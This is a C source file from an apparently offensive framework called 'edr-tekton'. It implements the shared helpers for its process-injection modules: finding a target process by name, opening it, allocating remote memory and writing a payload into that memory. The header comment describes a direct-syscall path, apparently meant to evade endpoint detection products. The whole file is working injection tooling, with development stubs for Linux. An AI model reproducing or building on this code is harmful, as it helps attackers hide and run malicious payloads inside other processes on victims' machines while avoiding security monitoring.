/*
 * edr-tekton :: Injection Utility Functions
 * Shared helpers used by all injection modules:
 *   - TektonInjectFindProcess:   enumerate processes, find PID by name
 *   - TektonInjectOpenTarget:    open handle to target process
 *   - TektonInjectAllocRemote:   allocate memory in target
 *   - TektonInjectWriteRemote:   write payload to target memory
 *
 * These use standard WinAPI (non-syscall) as the fallback path.
 * When the syscall engine is active, injection modules call Nt*
 * directly through resolved function pointers instead.
 */

#include "tekton/modules/inject.h"
#include "tekton/core/log.h"
#include <string.h>
#include <stdlib.h>

#ifdef _WIN32
#include <tlhelp32.h>
#endif

/* ── TektonInjectFindProcess ───────────────────────────── */

DWORD TektonInjectFindProcess(PTEKTON_CONTEXT ctx, const char* process_name) {
    (void)ctx;

    if (!process_name || process_name[0] == '\0') return 0;

#ifdef _WIN32
    HANDLE hSnap = CreateToolhelp32Snapshot(0x00000002 /* TH32CS_SNAPPROCESS */, 0);
    if (hSnap == (HANDLE)-1) {
        TLOG_ERROR("inject_utils: CreateToolhelp32Snapshot failed");
        return 0;
    }

    typedef struct tagPROCESSENTRY32 {
        DWORD   dwSize;
        DWORD   cntUsage;
        DWORD   th32ProcessID;
        ULONG_PTR th32DefaultHeapID;
        DWORD   th32ModuleID;
        DWORD   cntThreads;
        DWORD   th32ParentProcessID;
        long    pcPriClassBase;
        DWORD   dwFlags;
        char    szExeFile[260];
    } PROCESSENTRY32;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);

    typedef BOOL (WINAPI *pfnProcess32First)(HANDLE, PVOID);
    typedef BOOL (WINAPI *pfnProcess32Next)(HANDLE, PVOID);

    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    pfnProcess32First pFirst = (pfnProcess32First)
        GetProcAddress(hKernel32, "Process32First");
    pfnProcess32Next pNext = (pfnProcess32Next)
        GetProcAddress(hKernel32, "Process32Next");

    if (!pFirst || !pNext) {
        CloseHandle(hSnap);
        return 0;
    }

    DWORD found_pid = 0;

    if (pFirst(hSnap, &pe)) {
        do {
            /* Case-insensitive compare */
            if (_stricmp(pe.szExeFile, process_name) == 0) {
                found_pid = pe.th32ProcessID;
                break;
            }
        } while (pNext(hSnap, &pe));
    }

    CloseHandle(hSnap);

    if (found_pid) {
        TLOG_DEBUG("inject_utils: found '%s' at PID %lu",
            process_name, (unsigned long)found_pid);
    } else {
        TLOG_WARN("inject_utils: '%s' not found in process list", process_name);
    }

    return found_pid;
#else
    /* Linux dev stub: return a fake PID */
    TLOG_DEBUG("inject_utils: [STUB] FindProcess('%s') -> 1234", process_name);
    return 1234;
#endif
}

/* ── TektonInjectOpenTarget ────────────────────────────── */

TEKTON_STATUS TektonInjectOpenTarget(
    PTEKTON_CONTEXT ctx, DWORD pid, DWORD desired_access
) {
    if (pid == 0) return TEKTON_ERR_INVALID_PARAM;

#ifdef _WIN32
    HANDLE hProcess = OpenProcess(desired_access, FALSE, pid);
    if (!hProcess) {
        TLOG_ERROR("inject_utils: OpenProcess(%lu) failed (access=0x%08lX)",
            (unsigned long)pid, (unsigned long)desired_access);
        return TEKTON_ERR_INJECT_FAIL;
    }

    ctx->target_handle = hProcess;
    ctx->target_pid = pid;

    TLOG_DEBUG("inject_utils: opened PID %lu (handle=%p)",
        (unsigned long)pid, (void*)hProcess);
    return TEKTON_OK;
#else
    /* Linux dev stub */
    ctx->target_handle = (HANDLE)(ULONG_PTR)pid;
    ctx->target_pid = pid;
    TLOG_DEBUG("inject_utils: [STUB] opened PID %lu", (unsigned long)pid);
    return TEKTON_OK;
#endif
}

/* ── TektonInjectAllocRemote ───────────────────────────── */

TEKTON_STATUS TektonInjectAllocRemote(
    PTEKTON_CONTEXT ctx, SIZE_T size, DWORD protect
) {
    if (!ctx->target_handle || size == 0) return TEKTON_ERR_INVALID_PARAM;

#ifdef _WIN32
    PVOID addr = VirtualAllocEx(
        ctx->target_handle, NULL, size,
        MEM_COMMIT | MEM_RESERVE, protect
    );

    if (!addr) {
        TLOG_ERROR("inject_utils: VirtualAllocEx(%lu bytes, prot=0x%lX) failed",
            (unsigned long)size, (unsigned long)protect);
        return TEKTON_ERR_INJECT_FAIL;
    }

    ctx->remote_base = addr;

    TLOG_DEBUG("inject_utils: allocated %lu bytes at %p (prot=0x%lX)",
        (unsigned long)size, addr, (unsigned long)protect);
    return TEKTON_OK;
#else
    /* Linux dev stub */
    static BYTE stub_alloc[0x10000];
    ctx->remote_base = stub_alloc;
    TLOG_DEBUG("inject_utils: [STUB] allocated %lu bytes", (unsigned long)size);
    return TEKTON_OK;
#endif
}

/* ── TektonInjectWriteRemote ───────────────────────────── */

TEKTON_STATUS TektonInjectWriteRemote(
    PTEKTON_CONTEXT ctx, const BYTE* data, SIZE_T size
) {
    if (!ctx->target_handle || !ctx->remote_base || !data || size == 0)
        return TEKTON_ERR_INVALID_PARAM;

#ifdef _WIN32
    SIZE_T bytes_written = 0;
    BOOL ok = WriteProcessMemory(
        ctx->target_handle, ctx->remote_base,
        (LPCVOID)data, size, &bytes_written
    );

    if (!ok || bytes_written != size) {
        TLOG_ERROR("inject_utils: WriteProcessMemory failed (%lu/%lu bytes)",
            (unsigned long)bytes_written, (unsigned long)size);
        return TEKTON_ERR_INJECT_FAIL;
    }

    TLOG_DEBUG("inject_utils: wrote %lu bytes to %p",
        (unsigned long)bytes_written, ctx->remote_base);
    return TEKTON_OK;
#else
    /* Linux dev stub */
    TLOG_DEBUG("inject_utils: [STUB] wrote %lu bytes to %p",
        (unsigned long)size, ctx->remote_base);
    return TEKTON_OK;
#endif
}
